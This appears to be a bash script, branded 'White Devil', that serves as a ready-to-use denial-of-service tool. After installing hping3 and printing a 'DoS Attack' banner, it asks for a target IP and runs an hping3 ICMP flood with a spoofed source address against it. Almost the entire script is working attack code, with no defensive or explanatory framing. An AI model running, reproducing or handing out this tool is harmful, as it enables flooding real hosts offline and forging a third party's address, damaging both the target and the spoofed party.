
## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"
#initial 
printf "${BLUE}"
sudo apt-get install python3
sudo apt-get install hping3
clear
printf "${GREEN}"
printf "=================================\n"
printf "${ORANGE}"
figlet -w 100 -f standard "D   -    DoS  Attack"
printf "${BLUE}"
figlet -w 100 -f  standard ".           .WHITE DEVIL-GS "
printf "${GREEN}"
printf "=================================\n"
printf "${STOP}"

python3 temp.py
printf "\n${RED}[${WHITE}-${RED}]${ORANGE} IP -> "
read name
echo press ctrl+c to quit
sudo hping3 -1 --flood -a 192.165.73.12 $name

clear
echo "Thank You!!"
printf "\n${RED}[${WHITE}-${RED}]${ORANGE} Source - White Devil "
